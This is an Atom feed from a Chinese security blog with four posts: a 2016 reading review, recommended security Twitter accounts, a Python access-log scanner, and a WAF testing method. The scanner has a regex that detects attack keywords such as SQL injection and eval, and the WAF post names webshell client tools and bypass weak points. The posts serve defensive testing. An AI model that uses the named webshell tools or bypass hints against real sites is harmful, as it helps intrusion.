<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Lewsic</title>
  
  <link href="http://www.lewisec.com/atom.xml" rel="self"/>
  
  <link href="http://www.lewisec.com/"/>
  <updated>2017-01-04T15:27:59.000Z</updated>
  <id>http://www.lewisec.com/</id>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>盘点2016</title>
    <link href="http://www.lewisec.com/2017/01/04/%E7%9B%98%E7%82%B92016/"/>
    <id>http://www.lewisec.com/2017/01/04/盘点2016/</id>
    <published>2017-01-04T14:34:33.000Z</published>
    <updated>2017-01-04T15:27:59.000Z</updated>
    
    <content type="html"><![CDATA[<p>年终岁末，依照惯例还是要总结一下过去的一年。<br>因为最近工作原因，这篇文字有点滞后了。<br>还是从读过的书来回顾2016年吧。<br><a href="http://ob7tq8bas.bkt.clouddn.com/snipaste20170104_224637.png" target="_blank" rel="external">2016</a></p>
<a id="more"></a>
<p>这是2016我在豆瓣标注过读书的记录，全年读书总量比上一年度多了三本，不包含为了准备CISSP考试看过的辅导书和教材。<br>读书速度平均比上一年度提高了1天。<br>今年因为有了Kindle，读了很多电子书，买书其实比以前要少。也因为Kindle，可以利用通勤等碎片时间阅读。</p>
<p>今年读过的书，还是分三类：信息安全、小说、社科历史。</p>
<h4 id="信息安全"><a href="#信息安全" class="headerlink" title="信息安全"></a>信息安全</h4><p>信息安全方面，今年看的最多的还是CISSP的教材。AIO、CBK等几本大部头英文原著都啃下来了。<br>有了这个经历，现在看英文网站资料已经不怎么费劲了。</p>
<p>另外，完整读完了《SQL注入攻击与防御第二版》，系统的总结了SQLi的攻击技巧，感觉收获还是非常大。</p>
<h4 id="小说"><a href="#小说" class="headerlink" title="小说"></a>小说</h4><p>今年读了9本小说，重点推荐3本。</p>
<h6 id="巨人的陨落"><a href="#巨人的陨落" class="headerlink" title="巨人的陨落"></a>巨人的陨落</h6><p>这本书讲述的是一战前后欧洲各国的历史故事。把几家贵族的兴衰融入了大历史背景中，故事的主人公们和历史真实人物一同经历了历史大事件。<br>这种写法让我想起来《阿甘正传》。<br>比如，当你站在英国伯爵的背后，面对工人罢工，不自觉的会升起愤怒。<br>当你站在独立抗争的女管家的背后，面对贵族的歧视、社会的不公，你又会坚定的支持妇女平权。<br>这本书给我最大的触动是，站在不同阶级的不同立场看世界，得到的结论与判断会迥然不同。<br>这种阅读体验非常棒。</p>
<h6 id="白鹿原"><a href="#白鹿原" class="headerlink" title="白鹿原"></a>白鹿原</h6><p>电影只翻拍了全书不到三分之一的内容。作者从晚清一直写到了解放后，时间跨度虽大，但读起来并不累。<br>每个人物的兴衰荣辱，都透出一股子悲天悯人的情怀。历史也不会轻易地放过一个人、一个家。<br>当你站在历史的分岔路口，每一个看似正确无比的抉择，有可能就是自己在脖子上套上了一条绞索，只等着别人打开你脚下翻板的一瞬。<br>所以，在政治和历史的旋涡中，我们真的能把握自己的命运么？</p>
<h6 id="陆犯焉识"><a href="#陆犯焉识" class="headerlink" title="陆犯焉识"></a>陆犯焉识</h6><p>电影翻拍的内容同样只占全书很小的一部分。和白鹿原一样，只不过这本书的视角放在了旧上海的一个家族身上。<br>一位留学归来的高级知识分子，最后被历史一刀一刀的割成了“结巴的老几”。这种伤感由不得你不动容。<br>爱情这种似有实无的东西，反倒成了支撑主人公活下去的理由。</p>
<h4 id="社科历史"><a href="#社科历史" class="headerlink" title="社科历史"></a>社科历史</h4><p>同样重点推荐三本</p>
<h6 id="重说中国近代史"><a href="#重说中国近代史" class="headerlink" title="重说中国近代史"></a>重说中国近代史</h6><p>这是演讲的文字记录，所以门槛低，不需要太多的前置知识。<br>从这本书读到的近代史观，和教科书迥然不同，又非完全对立矛盾，非常适合入门。</p>
<h6 id="张作霖传-作者：徐彻"><a href="#张作霖传-作者：徐彻" class="headerlink" title="张作霖传 作者：徐彻"></a>张作霖传 作者：徐彻</h6><p>作者是正统历史研究者，其中一个头衔是“奉系军阀史研究会副会长”，所以他手里有很多一手历史素材。<br>这本书重点看记述的历史事件，资料非常详细。<br>但历史观就不用太当真了，凡是结论性的文字，建议跳过，毕竟作者是体制内。</p>
<h6 id="激荡三十年"><a href="#激荡三十年" class="headerlink" title="激荡三十年"></a>激荡三十年</h6><p>沧桑巨变的三十年，很多事情自己在亲历，却不以为然。透过这本书，试着理解自己的生活，和那段年代。<br>理解当下有中国特色的市场经济体制，必须要了解计划经济是怎么一步步搞活和开放成了现在的样子。</p>
<p>总的说来，2016年完成了自己的目标，顺利拿到了CISSP证书，顺利换了工作。陪家人和孩子的时间多了很多，我很欣慰。<br>希望2017年，技术积累更扎实一些。书架上买回来还没看的书更少一点。</p>
<p>祝各位新年快乐！</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;年终岁末，依照惯例还是要总结一下过去的一年。&lt;br&gt;因为最近工作原因，这篇文字有点滞后了。&lt;br&gt;还是从读过的书来回顾2016年吧。&lt;br&gt;&lt;a href=&quot;http://ob7tq8bas.bkt.clouddn.com/snipaste20170104_224637.png&quot;&gt;2016&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="安全相关" scheme="http://www.lewisec.com/categories/%E5%AE%89%E5%85%A8%E7%9B%B8%E5%85%B3/"/>
    
      <category term="读书笔记" scheme="http://www.lewisec.com/categories/%E5%AE%89%E5%85%A8%E7%9B%B8%E5%85%B3/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="安全" scheme="http://www.lewisec.com/tags/%E5%AE%89%E5%85%A8/"/>
    
      <category term="书评" scheme="http://www.lewisec.com/tags/%E4%B9%A6%E8%AF%84/"/>
    
  </entry>
  
  <entry>
    <title>值得关注的安全行业twitter</title>
    <link href="http://www.lewisec.com/2016/11/20/%E5%80%BC%E5%BE%97%E5%85%B3%E6%B3%A8%E7%9A%84%E5%AE%89%E5%85%A8%E8%A1%8C%E4%B8%9Atwitter/"/>
    <id>http://www.lewisec.com/2016/11/20/值得关注的安全行业twitter/</id>
    <published>2016-11-20T13:26:48.000Z</published>
    <updated>2016-11-20T14:17:49.755Z</updated>
    
    <content type="html"><![CDATA[<p>安全行业的最新技术动向，大多墙外的信息源比墙内要新。<br>很多新的漏洞出来之后，技术分析文章，墙外也要比墙内出的要快。<br>作为安全行业的从业者，保持和这个行业最新趋势的同步，很有必要。<br>本文将梳理出我最近在关注的、值得推荐的、更新频率较高的twitter账户。</p>
<a id="more"></a>
<h3 id="黑客篇"><a href="#黑客篇" class="headerlink" title="黑客篇"></a>黑客篇</h3><ul>
<li>@Yang Yu ，这是大名鼎鼎的TK教主。<a href="https://twitter.com/tombkeeper" target="_blank" rel="external">@tombkeeper</a></li>
<li>@Soroush Dalili，国外擅长web安全的黑客。<a href="https://twitter.com/irsdl" target="_blank" rel="external">@irsdl</a></li>
<li>@Claud Xiao，在平底锅工作的华人大牛。不过发的推以英文为主。<a href="https://twitter.com/claud_xiao" target="_blank" rel="external">@claud_xiao</a></li>
<li>@Fatih Sevimli，国外某大牛，移动安全和web安全都懂。更新频率尚可。<a href="https://twitter.com/cyber__sec" target="_blank" rel="external">@cyber__sec</a></li>
<li>@HD Moore，Metasploit的创始人，更新频率还不错。<a href="https://twitter.com/hdmoore" target="_blank" rel="external">@hdmoore</a></li>
<li>@Ben Hayak，一位国外大牛，更新频率有点低。<a href="https://twitter.com/BenHayak" target="_blank" rel="external">@BenHayak</a></li>
<li>@Pralhad Chaskar‏，以转推为主。可以扩大视野。<a href="https://twitter.com/c0d3xpl0it" target="_blank" rel="external">@c0d3xpl0it</a></li>
<li>@4b5f5f4b，腾讯玄武安全实验室的大牛。<a href="https://twitter.com/4b5f5f4b" target="_blank" rel="external">@4b5f5f4b</a></li>
<li>@Mark Johnston，IBM的安全大牛。<a href="https://twitter.com/cognitivecyber" target="_blank" rel="external">@cognitivecyber</a></li>
<li>@.mario，国外一个大牛，以转推居多。<a href="https://twitter.com/0x6D6172696F" target="_blank" rel="external">@0x6D6172696F</a></li>
<li>@Bincker，360的一位研究员。<a href="https://twitter.com/Bincker" target="_blank" rel="external">@Bincker</a></li>
</ul>
<h3 id="安全站点篇"><a href="#安全站点篇" class="headerlink" title="安全站点篇"></a>安全站点篇</h3><ul>
<li>@DarkReading，主要以安全行业新闻为主的站点。<a href="https://twitter.com/DarkReading" target="_blank" rel="external">@DarkReading</a></li>
<li>@Threatpost，主要以安全行业动态为主的站点，也会有技术分析。<a href="https://twitter.com/threatpost" target="_blank" rel="external">@Threatpost</a></li>
<li>@InfosecurityMag，也是一个安全行业新闻站点。<a href="https://twitter.com/InfosecurityMag" target="_blank" rel="external">@InfosecurityMag</a></li>
<li>@SC Media，scmagazine.com的twitter，更新频率很高。<a href="https://twitter.com/SCMagazine" target="_blank" rel="external">@SCMagazine</a></li>
<li>@SecurityWeek，securityweek.com的twitter，会有移动安全和工控安全的料。<a href="https://twitter.com/SecurityWeek" target="_blank" rel="external">@securityweek.com</a></li>
<li>@The Hacker News，行业新闻居多。<a href="https://twitter.com/TheHackersNews" target="_blank" rel="external">@TheHackersNews</a></li>
<li>@IT Security Tweets，更新频率很高，值得推荐。<a href="https://twitter.com/F1r3h4nd" target="_blank" rel="external">@F1r3h4nd</a></li>
<li>@Darknet.org.uk ，更新频率有点低，但是内容还不错。<a href="https://twitter.com/THEdarknet" target="_blank" rel="external">@THEdarknet</a></li>
<li>@0day Today Database，会发很多0day的动向，居家旅行必备！<a href="https://twitter.com/inj3ct0r" target="_blank" rel="external">@inj3ct0r</a></li>
<li>@Help Net Security，以行业动向为主。<a href="https://twitter.com/helpnetsecurity" target="_blank" rel="external">@helpnetsecurity</a></li>
<li>@Hacker News，这个就不多说了吧，更新频率巨高。<a href="https://twitter.com/newsycombinator" target="_blank" rel="external">@newsycombinator</a></li>
<li>@E Hacking News，一天一推的频率。<a href="https://twitter.com/EHackerNews" target="_blank" rel="external">@EHackerNews</a></li>
<li>@Core Security，以行业新闻为主。<a href="https://twitter.com/CoreSecurity" target="_blank" rel="external">@CoreSecurity</a></li>
<li>@Techworm_in，行业新闻居多，不过我挺喜欢他家的新闻。<a href="https://twitter.com/Techworm_in" target="_blank" rel="external">@Techworm_in</a></li>
<li>@NetworkSecurityNews，也是一个新闻站，也是我主要看的账号之一。<a href="https://twitter.com/NetworkSecNws" target="_blank" rel="external">@NetworkSecNws</a></li>
<li>@Security Network™，新闻质量还不错，而且频率高。<a href="https://twitter.com/SecurityL1st" target="_blank" rel="external">@SecurityL1st</a></li>
<li>@Secure Dude，频率高，质量好。<a href="https://twitter.com/SecurityMagnate" target="_blank" rel="external">@SecurityMagnate</a></li>
<li>@XSS Payloads，专门收集各类xss的payload，web狗必备。<a href="https://twitter.com/XssPayloads" target="_blank" rel="external">@XssPayloads</a></li>
<li>@DEF CON，这个应该不用介绍了。<a href="https://twitter.com/defcon" target="_blank" rel="external">@defcon</a></li>
<li>@Offensive Security，质量还行，频率尚可。<a href="https://twitter.com/offsectraining" target="_blank" rel="external">@offsectraining</a></li>
<li>@packet storm，频率不错，质量也还行。<a href="https://twitter.com/packet_storm" target="_blank" rel="external">@packet_storm</a></li>
<li>@ShapeSecurity，安全的各个层面他家都有介绍。<a href="https://twitter.com/ShapeSecurity" target="_blank" rel="external">@ShapeSecurity</a></li>
<li>@CSOonline，csoonline.com的官微。<a href="https://twitter.com/CSOonline" target="_blank" rel="external">@CSOonline</a></li>
</ul>
<h3 id="安全公司篇"><a href="#安全公司篇" class="headerlink" title="安全公司篇"></a>安全公司篇</h3><ul>
<li>@FireEye，火眼的官微，广告不那么多，技术含量不错。<a href="https://twitter.com/FireEye" target="_blank" rel="external">@FireEye</a></li>
<li>@Palo Alto Networks，平底锅的官微，偶有硬广，技术含量还是很高的。<a href="https://twitter.com/PaloAltoNtwks" target="_blank" rel="external">@PaloAltoNtwks</a></li>
<li>@sqlmap，这个不多说了。都懂。<a href="https://twitter.com/sqlmap" target="_blank" rel="external">@sqlmap</a></li>
<li>@Black Hat，更新频率有点低。<a href="https://twitter.com/BlackHatEvents" target="_blank" rel="external">@BlackHatEvents</a></li>
<li>@F5 Networks Security，F5专门发安全新闻的号，偶有硬广。<a href="https://twitter.com/F5Security" target="_blank" rel="external">@F5Security</a></li>
<li>@Fortinet，飞塔的官微，偶有硬广。<a href="https://twitter.com/Fortinet" target="_blank" rel="external">@Fortinet</a></li>
<li>@Imperva，他家的WAF和数据库审计还是不错的。<a href="https://twitter.com/Imperva" target="_blank" rel="external">@Imperva</a></li>
<li>@Microsoft Secure，微软安全官微，质量不错。<a href="https://twitter.com/msftsecurity" target="_blank" rel="external">@msftsecurity</a></li>
<li>@netsparker，他家的扫描器你肯定用过。<a href="https://twitter.com/netsparker" target="_blank" rel="external">@netsparker</a></li>
<li>@Metasploit Project，这个也不多介绍了吧。<a href="https://twitter.com/metasploit" target="_blank" rel="external">@metasploit</a></li>
<li>@Checkmarx，做源码审计产品的大公司。<a href="https://twitter.com/Checkmarx" target="_blank" rel="external">@Checkmarx</a></li>
<li>@varmournetworks，一家安全初创公司。<a href="https://twitter.com/varmournetworks" target="_blank" rel="external">@varmournetworks</a></li>
<li>@ZIMPERIUM，一家做移动安全的初创公司。<a href="https://twitter.com/ZIMPERIUM" target="_blank" rel="external">@ZIMPERIUM</a></li>
<li>@ReliaQuest，一家安全服务平台公司。<a href="https://twitter.com/ReliaQuest" target="_blank" rel="external">@ReliaQuest</a></li>
</ul>
<p>关注的比较多，我现在每天中午会花半小时浏览所有更新内容，把感兴趣的存在pocket里面，晚上临睡前集中读完。不然时间都碎片化了，效率太低。<br>也希望读者可以在评论里贡献你关注的高质量账户。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;安全行业的最新技术动向，大多墙外的信息源比墙内要新。&lt;br&gt;很多新的漏洞出来之后，技术分析文章，墙外也要比墙内出的要快。&lt;br&gt;作为安全行业的从业者，保持和这个行业最新趋势的同步，很有必要。&lt;br&gt;本文将梳理出我最近在关注的、值得推荐的、更新频率较高的twitter账户。&lt;/p&gt;
    
    </summary>
    
      <category term="安全相关" scheme="http://www.lewisec.com/categories/%E5%AE%89%E5%85%A8%E7%9B%B8%E5%85%B3/"/>
    
    
      <category term="安全" scheme="http://www.lewisec.com/tags/%E5%AE%89%E5%85%A8/"/>
    
      <category term="twitter" scheme="http://www.lewisec.com/tags/twitter/"/>
    
  </entry>
  
  <entry>
    <title>使用python分析access日志</title>
    <link href="http://www.lewisec.com/2016/10/25/%E4%BD%BF%E7%94%A8python%E5%88%86%E6%9E%90access%E6%97%A5%E5%BF%97/"/>
    <id>http://www.lewisec.com/2016/10/25/使用python分析access日志/</id>
    <published>2016-10-25T15:10:27.000Z</published>
    <updated>2016-10-25T15:24:06.173Z</updated>
    
    <content type="html"><![CDATA[<p>最近在自学python，光看不练嘴把式，还是要多实操的。这就是一个写给自己的小小工具。<br>主要功能是，便利日志文件夹下的文件，根据设定的关键字查找是否有web攻击行为。</p>
<a id="more"></a>
<h3 id="0X01-背景"><a href="#0X01-背景" class="headerlink" title="0X01 背景"></a>0X01 背景</h3><p>WAF上线之后，处理最多的是误报消除。<br>产生误报有多种原因，比如web应用源码编写时允许客户端提交过多的cookie；比如单个参数提交的数值太大。<br>把误报降低到了可接受的范围后，还要关注漏报。WAF不是神，任何WAF都可能被绕过。所以还需要定位漏过的攻击，明确漏报的原因，才能update WAF的策略。<br>要定位漏报，就必须分析Web应用的访问日志了。一个站点，每天产生的access日志大概接近1GB，显然靠肉眼看是不现实的。这就需要用python帮助自动分析。</p>
<h3 id="0X02-思路"><a href="#0X02-思路" class="headerlink" title="0X02 思路"></a>0X02 思路</h3><p>拿我司某Web系统举例：</p>
<ul>
<li>apache开启了access日志记录</li>
<li>日志规则是每小时生成一个日志文件，以站点名称为文件名，以日期+时间为后缀。例如：special.XXXXXX.com.cn.2016101001</li>
</ul>
<p>要分析这些散碎的日志文件，我的思路如下：</p>
<ol>
<li>根据用户命令行输入获取日志文件所在目录；</li>
<li>遍历目录下所有文件，合并到一个文件；</li>
<li>定义web攻击常见payload的字符串：<ul>
<li>SQLi的：select、union、+–+；</li>
<li>Struts的：ognl、java</li>
<li>webshell常见的：base64、eval、excute</li>
</ul>
</li>
<li>使用正则逐行匹配，将命中的日志复制到单独的文件。</li>
</ol>
<h3 id="0X03-实现"><a href="#0X03-实现" class="headerlink" title="0X03 实现"></a>0X03 实现</h3><p>代码如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># -*-coding: utf-8 -*-</span></div><div class="line"><span class="keyword">import</span> os,re,sys</div><div class="line"></div><div class="line"><span class="keyword">if</span> len(sys.argv) != <span class="number">2</span> :</div><div class="line">    <span class="keyword">print</span> <span class="string">'Usage : python logaudit.py &lt;path&gt;'</span></div><div class="line">    sys.exit()</div><div class="line"></div><div class="line">logpath = sys.argv[<span class="number">1</span>]</div><div class="line"></div><div class="line"><span class="comment">#获取输入参数的文件路径'</span></div><div class="line"></div><div class="line">merge = re.compile(<span class="string">r'.*(\d[10])'</span>)</div><div class="line"><span class="keyword">for</span> root , dirs , files <span class="keyword">in</span> os.walk(logpath):</div><div class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> files:</div><div class="line">        <span class="comment">#遍历日志文件夹，合并所有内容到一个文件</span></div><div class="line">        pipei = merge.match(line)</div><div class="line">        <span class="keyword">if</span> pipei != <span class="keyword">None</span>:</div><div class="line">            tmppath = root + <span class="string">'\\'</span> +line</div><div class="line">            logread1 = open(tmppath,<span class="string">'r'</span>)</div><div class="line">            logread = logread1.read()</div><div class="line">            log2txt = open(<span class="string">'.\\log.txt'</span>,<span class="string">'a'</span>)</div><div class="line">            log2txt.write(logread)</div><div class="line">            log2txt.close()</div><div class="line">            logread1.close()</div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            exit</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">log = open(<span class="string">'.//log.txt'</span>,<span class="string">'r'</span>)</div><div class="line"></div><div class="line"></div><div class="line">logread = log.readlines()</div><div class="line"></div><div class="line">auditString = re.compile(<span class="string">r'.*[^_][sS][eE][lL][eE][cC][tT][^.].*|.*[uU][nN][iI][Oo][nN].*|.*[bB][aA][sS][eE][^.].*|.*[oO][gG][nN][lL].*|.*[eE][vV][aA][lL][(].*|.*[eE][xX][cC][uU][tT][eE].*'</span>)</div><div class="line"></div><div class="line">writelog = open(<span class="string">'.//result.txt'</span>,<span class="string">'a'</span>)</div><div class="line"><span class="keyword">for</span> lines <span class="keyword">in</span> logread:</div><div class="line">    auditResult = auditString.match(lines)</div><div class="line">    <span class="keyword">if</span> auditResult != <span class="keyword">None</span>:</div><div class="line">        writelog.write(auditResult.group())</div><div class="line">        writelog.write(<span class="string">'\n'</span>)</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        exit</div><div class="line"></div><div class="line">writelog.close()</div><div class="line">log.close()</div></pre></td></tr></table></figure></p>
<p>0X04 后续<br>WAF上线后的运维工作，除了消除误报解决漏报以外，还有其他更多的分析工作。这方面的内容，我会整理出来，下次单独成文分享。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;最近在自学python，光看不练嘴把式，还是要多实操的。这就是一个写给自己的小小工具。&lt;br&gt;主要功能是，便利日志文件夹下的文件，根据设定的关键字查找是否有web攻击行为。&lt;/p&gt;
    
    </summary>
    
      <category term="安全相关" scheme="http://www.lewisec.com/categories/%E5%AE%89%E5%85%A8%E7%9B%B8%E5%85%B3/"/>
    
    
      <category term="Python" scheme="http://www.lewisec.com/tags/Python/"/>
    
      <category term="攻防" scheme="http://www.lewisec.com/tags/%E6%94%BB%E9%98%B2/"/>
    
      <category term="日志分析" scheme="http://www.lewisec.com/tags/%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>从甲方的角度谈谈WAF测试方法--part2</title>
    <link href="http://www.lewisec.com/2016/10/10/%E4%BB%8E%E7%94%B2%E6%96%B9%E7%9A%84%E8%A7%92%E5%BA%A6%E8%B0%88%E8%B0%88WAF%E6%B5%8B%E8%AF%95%E6%96%B9%E6%B3%95-part2/"/>
    <id>http://www.lewisec.com/2016/10/10/从甲方的角度谈谈WAF测试方法-part2/</id>
    <published>2016-10-10T13:29:19.000Z</published>
    <updated>2016-10-10T13:40:36.568Z</updated>
    
    <content type="html"><![CDATA[<p>继Part1之后，停了将近半个月才动笔写第二部分，不是因为懒，实在是最近几个项目事情多。顺手还准备了几个面试，耽搁到了现在。<br>今天把这篇给自己的总结写完吧。</p>
<a id="more"></a>
<h3 id="0X04-Webshell防御"><a href="#0X04-Webshell防御" class="headerlink" title="0X04 Webshell防御"></a>0X04 Webshell防御</h3><ul>
<li>webshell拦截</li>
</ul>
<p>文件上传防御难免百密一疏，普通的webshell上传后，攻击者必然要通过与webshell通信，开展后续渗透。WAF必须有能力识别通信内容，并及时阻断。很多webshell的通信内容是经过base64编码的，WAF必须具备解码后准确分析的能力。<br>测试方法很简单，在服务器上放好测试的webshell，客户端通过WAF后访问webshell，执行重要的操作，如：dir、ls、net user等系统命令；连接操作数据库；上传下载文件等。<br>这项测试需要收集大量常用webshell，用于覆盖常见webshell的识别。Github上有一个项目收集了各种格式的webshell，妈妈再也不担心我找不到shell啦。<br><a href="https://github.com/tennc/webshell" target="_blank" rel="external">Github webshell collect</a></p>
<ul>
<li>一句话拦截</li>
</ul>
<p>如果服务器安装有杀毒软件，常见webshell是可以被查杀的。大马能拦住，小马当然也不能放过。一句话木马可是杀软无力识别的。<br>防御一句话，其实防御的是菜刀以及各种版本的菜刀与一句话的通信。<br>这里要重点说两款工具：</p>
<pre><code>- cknife：[项目地址](https://github.com/Chora10/Cknife)，这把刀可以自定义各种通信方式和php执行函数用于绕过waf检测。实际测试下来，的确很多家waf的默认策略对自定义模式拦截无力。
- antSword：[项目地址](https://github.com/antoor/antSword/releases)，修改版的菜刀，也很好用。
</code></pre><h3 id="0X05-暴力破解及其他杂项"><a href="#0X05-暴力破解及其他杂项" class="headerlink" title="0X05 暴力破解及其他杂项"></a>0X05 暴力破解及其他杂项</h3><ul>
<li><p>暴力破解<br>WAF必须具备识别工具自动爆破密码的能力，其实判断的原理不难，分析请求某个文件的某几个参数的频率即可。用BurpSuite测一测就知道。在WAF上需要手工配置防爆破的策略，指明请求的URI、用户需要输入的参数名、访问阈值条件。<br>F5 ASM在判断暴力破解行为时，会判断会话有效性，造成这里有个bug，使用burpsuite爆密码时ASM根本拦不住。开了售前ticket查了半天，联系研发才闹明白是判断机制设计所致，自然也就无法修改了。</p>
</li>
<li><p>机器访问<br>为了防止薅羊毛，WAF必须具备能力，根据用户自定义的URI、参数名、源IP/目的IP、目的URL等条件，拦截超出正常频率的机器访问行为。<br>这项测试非常考验设备的自定义程度，而Imperva在自定义策略的灵活性上，遥遥领先其他友商，无愧于Gartner第一象限的位置。自定义程度越高，策略越灵活，防御效果越好，对甲方工程师的技术要求也就越高。很多传统行业的甲方工程师由于不熟悉攻防，对HTTP没研究那么深，自定义策略反而成了工作的负担。在和Imperva工程师交流时多次看到其他同行发来的邮件，询问某某场景下实现某功能，应该如何配置。我觉得如果不懂HTTP，WAF干脆就不要玩了，纯粹是给自己找负担。从白帽子的角度来说，目标网站有WAF不可怕，渗透还是要坚持的，万一对方不懂HTTP呢。</p>
</li>
<li><p>指定参数拦截<br>在post表单中，安全基线要求代码必须判断用户输入内容是否合理。比如，手机号一项，必须提交13/15/17/18开头的11位纯数字。如果编码时实现该需求，一行正则匹配就搞定。但是你不能保证每个程序猿都是勤奋的。所以，用WAF帮助站点实现该需求是必备功能要求。<br>WAF必须具备识别制定URI的指定参数，提交的数据格式。这一项也是将各厂家区分开的重要指标。</p>
</li>
<li><p>命令注入<br>WAF还必须具备识别命令注入攻击的能力，这一项DVWA是提供了测试功能的。之所以重点拿出来说，是因为Imperva、F5 ASM在这里都存在明显的疏漏。常见系统命令，这两家的WAF都不能在默认策略下准确识别。这一点我很奇怪，明明特征库里是有这一类特征的，可为何检出率如此低？</p>
</li>
</ul>
<h3 id="0X06-设备自身安全"><a href="#0X06-设备自身安全" class="headerlink" title="0X06 设备自身安全"></a>0X06 设备自身安全</h3><p>WAF除了要保护目标网站的安全性之外，自身的安全性也不可或缺。别不信，FortiWeb的5.5.3版本就存在CSRF漏洞。国产主流的漏洞扫描产品，除了绿盟也都存在CSRF漏洞。<br>另外，要使用NMAP等各种工具扫描设备开放的端口，看看有没有什么服务存在已知漏洞。<br>第三，设备登录入口必须支持连续登录失败X次后拦截登录请求的功能，防止被爆破。<br>第四，设备web端会使用类似jQuery等库，而第三方库是有各种已知漏洞的，查到CVE后逐个验证下漏洞是否存在。<br>第四，开个WVS扫一扫页面吧，看看有没有什么明显的漏洞。</p>
<h3 id="0X07-自学习"><a href="#0X07-自学习" class="headerlink" title="0X07 自学习"></a>0X07 自学习</h3><p>商业WAF相比自研WAF，最大的优势在于自学习功能。商业WAF拥有多项专利技术，可以根据web应用的访问行为和流量，自动学习用户正常访问行为特征，据此建立防御策略。Imperva在这方面技术领先很多，专利也最多。如果用好了自学习功能，WAF的漏过能够很大程度上的改善。<br>但是，凡事没有绝对。WAF的自学习功能最大的困扰是误报。Web应用的功能非常复杂，请求方式千奇百怪，机器学习算法再精妙，也不可能百分百还原所有用户正常行为。一旦误判，大量的误报拦截会让管理员叫苦不迭。<br>实际测试下来，个人感觉自学习功能更多时候是厂商拿来做宣传的噱头和控标的一个指标项，但是实际在生产环境中使用它，最好还是慎之又慎，就连厂商工程师都不建议使用，你敢给领导打保票背这个雷吗？<br>但是自学习功能并非是聋子的耳朵–摆设。自学习最大的用处其实是分析用户行为的工具。用这个功能连续监控一个月之后，哪个URL被访问次数最多，用户的请求方法与行为是什么，可以通过自动报告一览无余。有了这个报告，后续在做Web应用调优、访客行为分析、判断误报等方面还是很有用的。</p>
<h3 id="0X08-第三方测试工具"><a href="#0X08-第三方测试工具" class="headerlink" title="0X08 第三方测试工具"></a>0X08 第三方测试工具</h3><p>除了上述各种手工测试项目，还可以使用第三方开源工具测试WAF的拦截能力。这里推荐两个工具。<br>第一：碳基体的测试工具：<a href="https://github.com/tanjiti/WAFTest" target="_blank" rel="external">项目地址</a><br>这款工具是用perl写的，在t文件夹下已经写好了很多测试脚本，这些脚本可以把攻击payload放在http协议的各个字段提交，用于测试WAF在不同http参数的识别能力。具体用法不多说了，碳基体写的非常清楚。<br>这里想说两点：</p>
<ol>
<li>X-Forwared-For是很多WAF会漏过的点。</li>
<li>没有哪家WAF可以百分百拦截所有测试脚本。换句话说，测出来漏过的地方，需要WAF上手工配置策略，白帽子们也可以在渗透时自由发挥了。</li>
</ol>
<p>第二：Ironbee项目：<a href="https://github.com/ironbee/waf-research" target="_blank" rel="external">项目地址</a><br>Ironbee是一款开源waf，这个项目是测试拦截率的攻击，也是用perl写的。同样的，baseline-detection目录下的脚本，也不是默认策略可以百分百识别的。</p>
<h3 id="0X09-管理与维护"><a href="#0X09-管理与维护" class="headerlink" title="0X09 管理与维护"></a>0X09 管理与维护</h3><p>WAF除了要满足低误报低漏报，还必须人性化易管理。下面的几个功能点，是从管理员角度出发测试的内容。</p>
<ul>
<li>设备操作日志：WAF的所有管理员操作必须留存日志备查。</li>
<li>管理员权限分割：管理员必须不能删除和操作设备日志，管理与审计权限必须分立。</li>
<li>误报后的快速例外：WAF会出现超过50%的误报，出现误报后，设备必须支持快速且简便的例外策略生成。</li>
<li>日志包含完整http的request和response，高亮显示违规内容。</li>
<li>日志可导出：WAF的日志必须支持以标准syslog格式导出，既可以与SIEM联动，也可以让管理员手工分析。</li>
<li>多种形式的报表展现：包括但不限于自定义源地址、目的地址、攻击手法、规则、日期时间等条件的自由组合生成报表。</li>
<li>流量可视化展现：统计每个站点流量、统计指定源的流量、统计点击次数，可视化展现。</li>
</ul>
<h3 id="0X10-写在最后"><a href="#0X10-写在最后" class="headerlink" title="0X10 写在最后"></a>0X10 写在最后</h3><ul>
<li>写这篇文章的初衷，绝非为某个品牌站台，或者贬损某个品牌。我在写作的过程中尽量避免带有个人感情色彩，尽量保持对品牌的中立性。任何WAF都是众多开发人员的辛苦结晶，每家都有自己独到的地方，也难免存在疏漏。希望通过甲方安全人员的和厂商研发人员的共同努力，把WAF完善的更好更易用。</li>
<li>受限于自己技术能力，测试方法和测试内容难免有遗漏或错误，希望读者反馈指正。</li>
<li>全文首发于安全客，<a href="http://bobao.360.cn/learning/detail/3088.html" target="_blank" rel="external">地址请戳</a> 很感谢360团队对我的认可。</li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;继Part1之后，停了将近半个月才动笔写第二部分，不是因为懒，实在是最近几个项目事情多。顺手还准备了几个面试，耽搁到了现在。&lt;br&gt;今天把这篇给自己的总结写完吧。&lt;/p&gt;
    
    </summary>
    
